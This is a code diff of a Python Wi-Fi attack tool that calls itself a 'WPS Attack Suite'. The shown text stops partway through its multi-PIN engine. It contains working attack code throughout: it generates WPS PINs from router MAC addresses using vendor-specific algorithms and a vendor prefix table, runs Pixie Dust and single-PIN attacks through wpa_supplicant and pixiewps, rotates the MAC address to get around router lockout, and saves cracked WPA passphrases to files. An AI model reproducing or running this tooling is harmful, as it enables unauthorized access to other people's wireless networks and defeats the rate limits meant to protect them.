@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Noyon.py — ULTRA Engine WPS Attack Suite
-# Author: Noyon | Owner: @mohammad_noyon | Channel: @SGCodexs
-# Architecture: External Engine Pattern | Lock Guard | MAC Rotation
-# Real Algorithms Only | Robust Error Handling
+# Noyon.py — ULTRA ENGINE WPS Attack Suite
+# Author: Noyon | Owner: @NOYONRRP | Channel: @mohammad_noyon_rrp
+# Architecture: External Engines | AutoChain | Lock Guard | MAC Rotation
 
 import sys
 import subprocess
@@ -19,7 +18,7 @@ import threading
 import random
 from abc import ABC, abstractmethod
 from datetime import datetime
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from enum import Enum
 import collections
 import statistics
@@ -39,40 +38,30 @@ except ImportError:
     Figlet = None
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  CONFIGURATION
-# ═══════════════════════════════════════════════════════════════════
 class Config:
-    # Timeouts
     WPA_SUPPLICANT_TIMEOUT = 15
     WPS_TRANSACTION_TIMEOUT = 90
     SOCKET_TIMEOUT = 8
     PIXIEWPS_TIMEOUT = 45
     SCAN_TIMEOUT = 45
-
-    # Lock Guard (critical for router rate-limit)
-    WPS_FAIL_THRESHOLD = 3          # fail count before MAC rotation
-    MAC_ROTATION_ENABLED = True     # auto-rotate MAC on lock
-    MAC_ROTATION_DELAY = 5          # seconds after rotation
-    LOCK_COOLDOWN = 30              # seconds to wait after lock detected
-    MAX_LOCK_RETRIES = 5            # max MAC rotations per BSSID
-
-    # PSK stage retry (PIN ok but PSK fails)
+    WPS_FAIL_THRESHOLD = 3
+    MAC_ROTATION_ENABLED = True
+    MAC_ROTATION_DELAY = 5
+    LOCK_COOLDOWN = 30
+    MAX_LOCK_RETRIES = 5
     PSK_RETRY_COUNT = 3
-    PSK_RETRY_DELAY = 10            # seconds between PSK retries
-
-    # Bruteforce
+    PSK_RETRY_DELAY = 10
     BRUTEFORCE_DEFAULT_DELAY = 1.0
     BRUTEFORCE_FAIL_PAUSE = 5
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  UI
+#  UI — FIXED (Normal colors, Termux-safe)
 # ═══════════════════════════════════════════════════════════════════
 class UI:
     RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
-    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
-    CYAN = '\033[96m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'; GRAY = '\033[90m'
+    GREEN = '\033[32m'; RED = '\033[31m'; YELLOW = '\033[33m'
+    CYAN = '\033[36m'; MAGENTA = '\033[35m'; WHITE = '\033[37m'; GRAY = '\033[90m'
 
     @staticmethod
     def ok(m): print(f'{UI.GREEN}[+]{UI.RESET} {m}')
@@ -85,23 +74,25 @@ class UI:
     @staticmethod
     def pixie(m): print(f'{UI.MAGENTA}[P]{UI.RESET} {m}')
     @staticmethod
-    def lock(m): print(f'{UI.RED}[🔒]{UI.RESET} {m}')
+    def lock(m): print(f'{UI.RED}[LOCK]{UI.RESET} {m}')
+    @staticmethod
+    def stage(m): print(f'{UI.CYAN}{UI.BOLD}▸ {m}{UI.RESET}')
     @staticmethod
     def plain(m=''): print(m)
     @staticmethod
-    def divider(): print(f'{UI.GRAY}{"─" * 60}{UI.RESET}')
+    def divider(): print(f'{UI.GRAY}{"─" * 55}{UI.RESET}')
     @staticmethod
     def section(t):
         print()
         print(f'{UI.CYAN}{UI.BOLD}▸ {t}{UI.RESET}')
-        print(f'{UI.GRAY}{"─" * 60}{UI.RESET}')
+        print(f'{UI.GRAY}{"─" * 55}{UI.RESET}')
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  MAC ADDRESS
+#  MAC
 # ═══════════════════════════════════════════════════════════════════
 class NetworkAddress:
-    def __init__(self, mac: Union[str, int]):
+    def __init__(self, mac):
         if isinstance(mac, int):
             self._int_repr = mac
             self._str_repr = self._int2mac(mac)
@@ -117,7 +108,10 @@ class NetworkAddress:
     def integer(self): return self._int_repr
     def __int__(self): return self.integer
     def __str__(self): return self.string
-    def __iadd__(self, o): self._int_repr += o; self._str_repr = self._int2mac(self._int_repr); return self
+    def __iadd__(self, o):
+        self._int_repr += o
+        self._str_repr = self._int2mac(self._int_repr)
+        return self
     def __eq__(self, o): return isinstance(o, NetworkAddress) and self.integer == o.integer
     def __hash__(self): return hash(self.integer)
 
@@ -130,17 +124,13 @@ class NetworkAddress:
         return ':'.join(h[i:i + 2] for i in range(0, 12, 2))
 
     @staticmethod
-    def random_mac(oui: str = '02') -> str:
-        """Generate random MAC with given OUI (default locally-administered)."""
+    def random_mac(oui='02'):
         parts = [oui.zfill(2).upper()]
         for _ in range(5):
             parts.append(f'{random.randint(0, 255):02X}')
         return ':'.join(parts)
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  STRING HELPERS
-# ═══════════════════════════════════════════════════════════════════
 def _str_width(s):
     if wcwidth is not None:
         w = wcwidth.wcswidth(s)
@@ -168,16 +158,13 @@ def truncate(s, length, postfix='…'):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  WPS PIN GENERATOR — Real Algorithms Only
+#  WPS PIN GENERATOR
 # ═══════════════════════════════════════════════════════════════════
 class WPSpin:
-    ALGO_MAC = 0
-    ALGO_EMPTY = 1
-    ALGO_STATIC = 2
+    ALGO_MAC = 0; ALGO_EMPTY = 1; ALGO_STATIC = 2
 
     VENDOR_DATABASE = {
-        'TP-Link': (
-            '5464D9', '1C3BF3', '60E327', 'B0487A', 'F81A67', 'F8D111',
+        'TP-Link': ('5464D9', '1C3BF3', '60E327', 'B0487A', 'F81A67', 'F8D111',
             '50465D', '788CF5', 'C025E9', '0023CD', '0024B2', '002719',
             '105172', '147CB8', '18909F', '349672', '3C6A2A', '403F8C',
             '485D60', '503CC8', '5465F3', '60E32B', '645299', '74EA3A',
@@ -190,8 +177,7 @@ class WPSpin:
             '50CCF8', '841630', '14CC20', '34BA9A', 'B4944E', '001D0F',
             '002127', '68FF7B', '98DAC4', '9C5322', 'B09575', 'CC81DA',
             'E4C32A', '000AEB', '001333', '001839', '001A2F', '001B2F',
-            '001E2A', '00223F', '002586', '003192', '502B73',
-        ),
+            '001E2A', '00223F', '002586', '003192', '502B73'),
         'Tenda': ('C83A35', '502B73', 'C86C87', 'E8CD2D', '00B00C', 'CC81DA',
                   '803F5D', '685B35', 'D8322E', 'E03676', 'E47185', 'F0B429',
                   '14CF92', '288088', '58D56E', '8C68C8'),
@@ -217,12 +203,9 @@ class WPSpin:
         'Linksys': ('149182', '20AA4B', '48F8B3', '586D8F', '6038E0', '687F74',
                     '94103E', 'C05627', 'E89F80', 'F4EC38'),
         'Belkin': ('08863B', '34E894', '58EF68', '944452', 'B4750E', 'EC1A59'),
-        'Buffalo': ('000D0B', '001601', '001D73', '106F3F', '3412C0', '4CE676',
-                    'A4AB9C', 'DCFB02'),
-        'Motorola': ('000CE5', '00111A', '001A1B', '001CBE', '00228A', '405FC2',
-                     '74E543', 'A47B2C'),
-        'Arris': ('001596', '001DCF', '00235E', '002495', '100D7F', '1C1B68',
-                  '3C7A8A', '4432C8'),
+        'Buffalo': ('000D0B', '001601', '001D73', '106F3F', '3412C0', '4CE676', 'A4AB9C', 'DCFB02'),
+        'Motorola': ('000CE5', '00111A', '001A1B', '001CBE', '00228A', '405FC2', '74E543', 'A47B2C'),
+        'Arris': ('001596', '001DCF', '00235E', '002495', '100D7F', '1C1B68', '3C7A8A', '4432C8'),
         'SMC': ('0004E2', '0013F7', '001E8C', '0022B0', 'B870F4', 'E09153'),
         'Ruckus': ('001392', '001FE1', '24C9A1', '2C5D93', '50A733', 'C08ADE', 'EC8EAE'),
         'USRobotics': ('000476', '000E2E', '001346', '00179A', '002233'),
@@ -290,8 +273,7 @@ class WPSpin:
         'UR-814AC': ('D4BF7F60',),
         'UR-825AC': ('D4BF7F5',),
         'DSL-2740R': ('00265A', '1CBDB9'),
-        'H108L': ('4C09B4', '4CAC0A', '84742A', '9CD24B', 'B075D5', 'C864C7',
-                  'DC028E', 'FCC897'),
+        'H108L': ('4C09B4', '4CAC0A', '84742A', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
         'TRENDnet': ('0014D1', '001E58', '0022B0', '002401', 'C8D3A3'),
         'EnGenius': ('00026F', '000E8E', '001F1F', '002275', '0024A5', 'C8BE19', 'D4BF7F'),
         'ZyxEL': ('001349', '0019CB', '0023F8', '00A0C5', '28285D', '404A03', '588BF3', '90EF68'),
@@ -311,17 +293,16 @@ class WPSpin:
         'Xiaomi': 'pin24', 'Xiaomi-MiWiFi': 'pin24', 'ZTE': 'pin24',
         'Huawei': 'pin24', 'Mercury': 'pin24', 'Phicomm': 'pin24',
         'TotoLink': 'pin24', 'iBall': 'pin24', 'Digisol': 'pin24',
-        'Beetel': 'pin24', 'Wavlink': 'pin24',
-        'Netgear': 'pin24', 'Linksys': 'pin24', 'Belkin': 'pin24',
-        'Buffalo': 'pin24', 'Motorola': 'pin24', 'Arris': 'pin24',
-        'SMC': 'pin24', 'Ruckus': 'pin24', 'USRobotics': 'pin24',
-        'Hawking': 'pin24', 'IOGear': 'pin24', 'Zoom': 'pin24',
-        'Ambit': 'pin24', 'Western-Digital': 'pin24',
-        'Sagemcom': 'pin24', 'Pirelli': 'pin24', 'Atlantis': 'pin24',
-        'Sitecom': 'pin24', 'AirTies': 'pin24', 'DrayTek': 'pin24',
-        'Billion': 'pin24', 'NetComm': 'pin24', 'Repotec': 'pin24',
-        'Sapido': 'pin24', 'SparkLAN': 'pin24', 'Tecom': 'pin24',
-        'Aztech': 'pin24', 'Corega': 'pin24',
+        'Beetel': 'pin24', 'Wavlink': 'pin24', 'Netgear': 'pin24',
+        'Linksys': 'pin24', 'Belkin': 'pin24', 'Buffalo': 'pin24',
+        'Motorola': 'pin24', 'Arris': 'pin24', 'SMC': 'pin24',
+        'Ruckus': 'pin24', 'USRobotics': 'pin24', 'Hawking': 'pin24',
+        'IOGear': 'pin24', 'Zoom': 'pin24', 'Ambit': 'pin24',
+        'Western-Digital': 'pin24', 'Sagemcom': 'pin24', 'Pirelli': 'pin24',
+        'Atlantis': 'pin24', 'Sitecom': 'pin24', 'AirTies': 'pin24',
+        'DrayTek': 'pin24', 'Billion': 'pin24', 'NetComm': 'pin24',
+        'Repotec': 'pin24', 'Sapido': 'pin24', 'SparkLAN': 'pin24',
+        'Tecom': 'pin24', 'Aztech': 'pin24', 'Corega': 'pin24',
         'Ralink': 'pin24', 'Atheros': 'pin24', 'Trendchip': 'pin24',
         'MediaTek': 'pin24', 'Ubiquiti': 'pin24', 'MikroTik': 'pin24',
         'Fortinet': 'pin24', 'Senao': 'pin24', 'Gigabyte': 'pin24',
@@ -374,15 +355,15 @@ class WPSpin:
         }
 
     @classmethod
-    def get_vendor(cls, mac: str) -> str:
-        clean_mac = mac.replace(':', '').upper()
+    def get_vendor(cls, mac):
+        clean = mac.replace(':', '').upper()
         for vendor, ouis in cls.VENDOR_DATABASE.items():
-            if clean_mac.startswith(ouis):
+            if clean.startswith(ouis):
                 return vendor
-        return 'Unknown / Generic'
+        return 'Unknown'
 
     @staticmethod
-    def checksum(pin: int) -> int:
+    def checksum(pin):
         accum = 0
         while pin:
             accum += (3 * (pin % 10))
@@ -391,21 +372,21 @@ class WPSpin:
             pin //= 10
         return (10 - accum % 10) % 10
 
-    def generate(self, algo: str, mac: Union[str, int]) -> str:
+    def generate(self, algo, mac):
         try:
             mac_obj = NetworkAddress(mac)
             if algo not in self.algos:
-                raise ValueError(f'Invalid WPS pin algorithm: {algo}')
+                raise ValueError(f'Invalid algorithm: {algo}')
             pin = self.algos[algo]['gen'](mac_obj)
             if algo == 'pinEmpty':
                 return ''
             pin = pin % 10000000
             return f'{pin:07d}{self.checksum(pin)}'
         except Exception as e:
-            UI.err(f'PIN generation failed for {algo} on {mac}: {e}')
+            UI.err(f'PIN gen failed ({algo}): {e}')
             return '12345670'
 
-    def getSuggested(self, mac: str) -> List[Dict[str, str]]:
+    def getSuggested(self, mac):
         return [{
             'id': ID,
             'name': ('Static — ' + self.algos[ID]['name'])
@@ -414,18 +395,18 @@ class WPSpin:
             'pin': self.generate(ID, mac),
         } for ID in self._suggest(mac)]
 
-    def getSuggestedList(self, mac: str) -> List[str]:
-        return [self.generate(algo, mac) for algo in self._suggest(mac)]
+    def getSuggestedList(self, mac):
+        return [self.generate(a, mac) for a in self._suggest(mac)]
 
-    def getLikely(self, mac: str) -> Optional[str]:
-        res = self.getSuggestedList(mac)
-        return res[0] if res else None
+    def getLikely(self, mac):
+        r = self.getSuggestedList(mac)
+        return r[0] if r else None
 
-    def _suggest(self, mac: str) -> List[str]:
-        clean_mac = mac.replace(':', '').upper()
+    def _suggest(self, mac):
+        clean = mac.replace(':', '').upper()
         suggested = ['pin24', 'pin28']
         for vendor, ouis in self.VENDOR_DATABASE.items():
-            if clean_mac.startswith(ouis):
+            if clean.startswith(ouis):
                 algo = self.VENDOR_ALGO.get(vendor)
                 if algo and algo not in suggested:
                     suggested.append(algo)
@@ -434,12 +415,12 @@ class WPSpin:
                 break
         return suggested
 
-    def pin24(self, mac): return mac.integer & 0xFFFFFF
-    def pin28(self, mac): return mac.integer & 0xFFFFFFF
-    def pin32(self, mac): return mac.integer % 0x100000000
+    def pin24(self, m): return m.integer & 0xFFFFFF
+    def pin28(self, m): return m.integer & 0xFFFFFFF
+    def pin32(self, m): return m.integer % 0x100000000
 
-    def pinDLink(self, mac):
-        nic = mac.integer & 0xFFFFFF
+    def pinDLink(self, m):
+        nic = m.integer & 0xFFFFFF
         pin = nic ^ 0x55AA55
         pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) +
                 ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
@@ -448,28 +429,25 @@ class WPSpin:
             pin += ((pin % 9) * int(10e5)) + int(10e5)
         return pin
 
-    def pinDLink1(self, mac):
-        mac += 1
-        return self.pinDLink(mac)
+    def pinDLink1(self, m):
+        m += 1
+        return self.pinDLink(m)
 
-    def pinASUS(self, mac):
-        b = [int(i, 16) for i in mac.string.split(':')]
+    def pinASUS(self, m):
+        b = [int(i, 16) for i in m.string.split(':')]
         pin = ''
         for i in range(7):
             pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
         return int(pin) if pin else 0
 
-    def pinAirocon(self, mac):
-        b = [int(i, 16) for i in mac.string.split(':')]
+    def pinAirocon(self, m):
+        b = [int(i, 16) for i in m.string.split(':')]
         return ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) \
              + (((b[4] + b[5]) % 10) * 100) + (((b[3] + b[4]) % 10) * 1000) \
              + (((b[2] + b[3]) % 10) * 10000) + (((b[1] + b[2]) % 10) * 100000) \
              + (((b[0] + b[1]) % 10) * 1000000)
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  DATA STRUCTURES
-# ═══════════════════════════════════════════════════════════════════
 def get_hex(line):
     parts = line.split(':', 3)
     if len(parts) < 3:
@@ -504,6 +482,8 @@ class ConnectionStatus:
         self.essid = ''
         self.wpa_psk = ''
         self.bssid = ''
+        self.wps_disabled = False     # NEW: detected when router refuses WPS
+        self.wps_unreachable = False  # NEW: no response at all
 
     def isFirstHalfValid(self): return self.last_m_message > 5
     def clear(self): self.__init__()
@@ -520,9 +500,9 @@ class BruteforceStatus:
 
     def display_status(self):
         avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
-        percentage = (int(self.mask) / 11000 * 100) if len(self.mask) == 4 \
+        pct = (int(self.mask) / 11000 * 100) if len(self.mask) == 4 \
             else ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        UI.info(f'{percentage:.2f}% complete @ {self.start_time} ({avg:.2f} sec/pin)')
+        UI.info(f'{pct:.2f}% complete @ {self.start_time} ({avg:.2f} sec/pin)')
 
     def registerAttempt(self, mask):
         self.mask = mask
@@ -535,9 +515,6 @@ class BruteforceStatus:
             self.display_status()
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  LOCK GUARD — WPS Lock Detection + MAC Rotation
-# ═══════════════════════════════════════════════════════════════════
 class LockState(Enum):
     CLEAN = 'clean'
     WARNING = 'warning'
@@ -547,11 +524,6 @@ class LockState(Enum):
 
 @dataclass
 class LockGuard:
-    """
-    Detects WPS lock (rate limiting) and rotates MAC to bypass.
-    Solves the common issue: PIN found, but PSK stage fails
-    because router blocks after N attempts.
-    """
     interface: str
     bssid: str
     original_mac: str = ''
@@ -564,7 +536,7 @@ class LockGuard:
     def __post_init__(self):
         self.original_mac = self._get_interface_mac()
 
-    def _get_interface_mac(self) -> str:
+    def _get_interface_mac(self):
         try:
             r = subprocess.run(
                 f'cat /sys/class/net/{self.interface}/address',
@@ -574,12 +546,10 @@ class LockGuard:
             return ''
 
     def record_success(self):
-        """Reset counter on success."""
         self.fail_count = 0
         self.state = LockState.CLEAN
 
-    def record_fail(self) -> LockState:
-        """Call on each WPS-FAIL. Returns new state."""
+    def record_fail(self):
         self.fail_count += 1
         if self.fail_count >= Config.WPS_FAIL_THRESHOLD:
             self.state = LockState.LOCKED
@@ -588,16 +558,15 @@ class LockGuard:
             self.state = LockState.WARNING
         return self.state
 
-    def is_locked(self) -> bool:
+    def is_locked(self):
         return self.state == LockState.LOCKED
 
-    def rotate_mac(self) -> bool:
-        """Bring iface down, change MAC, bring back up. Returns success."""
+    def rotate_mac(self):
         if not Config.MAC_ROTATION_ENABLED:
-            UI.warn('MAC rotation disabled in config')
+            UI.warn('MAC rotation disabled')
             return False
         if self.rotation_count >= Config.MAX_LOCK_RETRIES:
-            UI.err(f'Max MAC rotations ({Config.MAX_LOCK_RETRIES}) reached')
+            UI.err(f'Max MAC rotations reached')
             return False
 
         self.state = LockState.ROTATING
@@ -605,11 +574,9 @@ class LockGuard:
         UI.lock(f'Rotating MAC: {self.original_mac} → {new_mac}')
 
         try:
-            # Down
             subprocess.run(f'ip link set {self.interface} down',
                            shell=True, timeout=5, check=False)
             time.sleep(0.5)
-            # Change MAC
             r = subprocess.run(
                 f'ip link set {self.interface} address {new_mac}',
                 shell=True, capture_output=True, text=True, timeout=5)
@@ -619,7 +586,6 @@ class LockGuard:
                                shell=True, timeout=5, check=False)
                 return False
             time.sleep(0.5)
-            # Up
             subprocess.run(f'ip link set {self.interface} up',
                            shell=True, timeout=5, check=False)
             time.sleep(1.5)
@@ -629,18 +595,14 @@ class LockGuard:
             self.fail_count = 0
             self.state = LockState.CLEAN
 
-            # Restore original interface state
-            subprocess.run(f'ip link set {self.interface} up',
-                           shell=True, timeout=5, check=False)
             time.sleep(Config.MAC_ROTATION_DELAY)
-            UI.ok(f'MAC rotated to {new_mac} (rotation #{self.rotation_count})')
+            UI.ok(f'MAC rotated to {new_mac} (#{self.rotation_count})')
             return True
         except Exception as e:
-            UI.err(f'MAC rotation exception: {e}')
+            UI.err(f'MAC rotation error: {e}')
             return False
 
     def restore_mac(self):
-        """Restore original MAC after attack."""
         if not self.original_mac or not Config.MAC_ROTATION_ENABLED:
             return
         try:
@@ -651,17 +613,16 @@ class LockGuard:
                 shell=True, timeout=5, check=False)
             subprocess.run(f'ip link set {self.interface} up',
                            shell=True, timeout=5, check=False)
-            UI.info(f'MAC restored to {self.original_mac}')
+            UI.info(f'MAC restored')
         except Exception:
             pass
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  COMPANION — Core Attack Backend (Used by all engines)
+#  COMPANION
 # ═══════════════════════════════════════════════════════════════════
 class Companion:
-    def __init__(self, interface: str, save_result: bool = False,
-                 print_debug: bool = False, bssid: str = ''):
+    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
@@ -713,12 +674,11 @@ class Companion:
         while True:
             ret = self.wpas.poll()
             if ret is not None and ret != 0:
-                raise ValueError(
-                    f'wpa_supplicant error: {self.wpas.communicate()[0] or ""}')
+                raise ValueError(f'wpa_supplicant error: {self.wpas.communicate()[0] or ""}')
             if os.path.exists(self.wpas_ctrl_path):
                 break
             if time.time() - start > Config.WPA_SUPPLICANT_TIMEOUT:
-                raise TimeoutError('wpa_supplicant start timeout')
+                raise TimeoutError('wpa_supplicant timeout')
             time.sleep(.1)
 
     def sendOnly(self, cmd):
@@ -739,8 +699,7 @@ class Companion:
             UI.err(f'sendAndReceive: {e}')
             return ''
 
-    def __handle_wpas(self, pixiemode=False, pbc_mode=False,
-                      verbose=None, bssid='') -> bool:
+    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=''):
         if verbose is None:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
@@ -756,16 +715,16 @@ class Companion:
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
-                UI.info(f'Sending WPS Message M{n}…')
+                UI.info(f'Sending M{n}…')
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
-                UI.info(f'Received WPS Message M{n}')
+                UI.info(f'Received M{n}')
                 if n == 5:
-                    UI.ok('First half of PIN is valid')
+                    UI.ok('First half valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
-                UI.warn('Received WSC NACK (wrong PIN)')
+                UI.warn('WSC NACK (wrong PIN)')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 if pixiemode:
@@ -793,15 +752,21 @@ class Companion:
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = (
-                    bytes.fromhex(get_hex(line))
-                    .decode('utf-8', errors='replace'))
+                    bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace'))
+            # NEW: detect WPS completely disabled
+            elif 'WPS: Registration failed' in line or 'WPS registration failed' in line:
+                self.connection_status.wps_disabled = True
+                UI.err('WPS registration refused — likely disabled on router')
+            elif 'WPS: Could not connect' in line or 'Could not connect to' in line:
+                self.connection_status.wps_unreachable = True
+                UI.err('WPS unreachable — router may have WPS off')
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
                 UI.warn('Scanning…')
         elif 'WPS-FAIL' in line and self.connection_status.status:
             self.connection_status.status = 'WPS_FAIL'
-            UI.err('wpa_supplicant returned WPS-FAIL')
+            UI.err('WPS-FAIL')
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
@@ -813,26 +778,25 @@ class Companion:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = self.__decode_ssid(line)
-            UI.warn('Associating with AP…')
+            UI.warn('Associating…')
         elif 'Associated with' in line and self.interface in line:
             bt = line.split()[-1].upper()
             if self.connection_status.essid:
-                UI.ok(f'Associated with {bt} (ESSID: {self.connection_status.essid})')
+                UI.ok(f'Associated with {bt} ({self.connection_status.essid})')
             else:
                 UI.ok(f'Associated with {bt}')
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            UI.info('Sending EAPOL Start…')
+            UI.info('EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
-            UI.info('Received Identity Request')
+            UI.info('Identity Request')
         elif 'using real identity' in line:
-            UI.info('Sending Identity Response…')
+            UI.info('Identity Response')
         elif bssid and bssid in line and 'level=' in line:
-            signal = line.split("level=")[1].split(" ")[0]
-            self.lastPwr = signal
+            self.lastPwr = line.split("level=")[1].split(" ")[0]
             if verbose:
-                UI.info(f'Signal: {signal}')
-        elif pbc_mode and ('selected BSS ' in line):
+                UI.info(f'Signal: {self.lastPwr}')
+        elif pbc_mode and 'selected BSS ' in line:
             bt = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = bt
             UI.info(f'Selected AP: {bt}')
@@ -854,8 +818,7 @@ class Companion:
         try:
             r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=sys.stdout, encoding='utf-8',
-                               errors='replace',
-                               timeout=Config.PIXIEWPS_TIMEOUT)
+                               errors='replace', timeout=Config.PIXIEWPS_TIMEOUT)
             print(r.stdout)
             if r.returncode == 0:
                 for line in r.stdout.splitlines():
@@ -876,18 +839,15 @@ class Companion:
     def save_result(self, bssid, essid, wps_pin, wpa_psk):
         filename = self.reports_dir + 'stored'
         dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
-
         with open(filename + '.txt', 'a', encoding='utf-8') as f:
             f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
                     f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
-
         write_header = not os.path.isfile(filename + '.csv')
         with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
             w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
             if write_header:
                 w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-
         json_file = filename + '.json'
         data = []
         if os.path.exists(json_file):
@@ -903,14 +863,13 @@ class Companion:
                      'wps_pin': wps_pin, 'wpa_psk': wpa_psk})
         with open(json_file, 'w', encoding='utf-8') as jf:
             json.dump(data, jf, indent=4)
-
-        UI.info(f'Saved to {filename}.txt/.csv/.json')
+        UI.info(f'Saved to reports/')
 
     def save_pin(self, bssid, pin):
         filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
         with open(filename, 'w') as f:
             f.write(pin)
-        UI.info(f'PIN saved in {filename}')
+        UI.info(f'PIN saved')
 
     def cleanup(self):
         try:
@@ -950,63 +909,56 @@ class Companion:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE BASE — External Engine Architecture
+#  ENGINE BASE
 # ═══════════════════════════════════════════════════════════════════
 class AttackEngine(ABC):
-    """Base class for all attack engines."""
-
     name = 'Base'
     description = 'Base engine'
 
-    def __init__(self, companion: Companion):
+    def __init__(self, companion):
         self.c = companion
         self.generator = companion.generator
         self.result = False
 
     @abstractmethod
-    def run(self, bssid: str, **kwargs) -> bool:
-        """Execute attack. Returns True on success."""
+    def run(self, bssid, **kwargs) -> bool:
         pass
 
-    def _handle_lock(self) -> bool:
-        """
-        Handle WPS lock: called after WPS_FAIL.
-        Returns True if MAC rotated (attack may continue).
-        """
+    def _handle_lock(self):
         state = self.c.lock_guard.record_fail()
         if state == LockState.LOCKED:
-            UI.lock(f'WPS lock detected after '
-                    f'{self.c.lock_guard.fail_count} failures!')
+            UI.lock(f'WPS lock ({self.c.lock_guard.fail_count} fails)')
             UI.warn(f'Cooldown {Config.LOCK_COOLDOWN}s…')
             time.sleep(Config.LOCK_COOLDOWN)
             if self.c.lock_guard.rotate_mac():
-                UI.ok('Lock bypassed via MAC rotation')
+                UI.ok('Lock bypassed')
                 return True
-            UI.err('Could not bypass lock')
+            UI.err('Cannot bypass lock')
         return False
+
+    def _reset_wps_state(self):
+        self.c.connection_status.wps_disabled = False
+        self.c.connection_status.wps_unreachable = False
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: Single PIN Attack
+#  ENGINE: Single PIN
 # ═══════════════════════════════════════════════════════════════════
 class SinglePinEngine(AttackEngine):
     name = 'Single PIN'
     description = 'Attack with specific PIN'
 
-    def __init__(self, companion, pin: str):
+    def __init__(self, companion, pin):
         super().__init__(companion)
         self.pin = pin
 
-    def run(self, bssid: str, **kwargs) -> bool:
+    def run(self, bssid, **kwargs):
         UI.section(f'Engine: {self.name}')
         UI.info(f'Target: {bssid}')
         UI.info(f'PIN: {self.pin}')
+        return self._wps_attempt(bssid, self.pin)
 
-        result = self._wps_attempt(bssid, self.pin)
-        return result
-
-    def _wps_attempt(self, bssid, pin) -> bool:
-        """Single WPS transaction with lock handling + PSK retry."""
+    def _wps_attempt(self, bssid, pin):
         c = self.c
         c.pixie_creds.clear()
         c.connection_status.clear()
@@ -1024,7 +976,7 @@ class SinglePinEngine(AttackEngine):
         r = c.sendAndReceive(cmd)
         if 'OK' not in r:
             c.connection_status.status = 'WPS_FAIL'
-            UI.err(f'wpa_supplicant rejected command: {r.strip()}')
+            UI.err(f'Rejected: {r.strip()}')
             self._handle_lock()
             return False
 
@@ -1044,6 +996,8 @@ class SinglePinEngine(AttackEngine):
                 break
             if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                 break
+            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
+                break
             if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                 UI.err('Transaction timeout')
                 c.connection_status.status = 'WPS_FAIL'
@@ -1053,11 +1007,9 @@ class SinglePinEngine(AttackEngine):
 
         if c.connection_status.status == 'GOT_PSK':
             c.lock_guard.record_success()
-            c.print_credentials(pin, c.connection_status.wpa_psk,
-                                c.connection_status.essid)
+            c.print_credentials(pin, c.connection_status.wpa_psk, c.connection_status.essid)
             if c.save_result:
-                c.save_result(bssid, c.connection_status.essid, pin,
-                              c.connection_status.wpa_psk)
+                c.save_result(bssid, c.connection_status.essid, pin, c.connection_status.wpa_psk)
             return True
         elif c.connection_status.status == 'WPS_FAIL':
             self._handle_lock()
@@ -1065,39 +1017,41 @@ class SinglePinEngine(AttackEngine):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: Multi-PIN Try (Suggested PINs)
+#  ENGINE: Multi-PIN
 # ═══════════════════════════════════════════════════════════════════
 class MultiPinEngine(AttackEngine):
     name = 'Multi-PIN'
-    description = 'Try all suggested PINs in order'
+    description = 'Try all suggested PINs'
 
-    def run(self, bssid: str, **kwargs) -> bool:
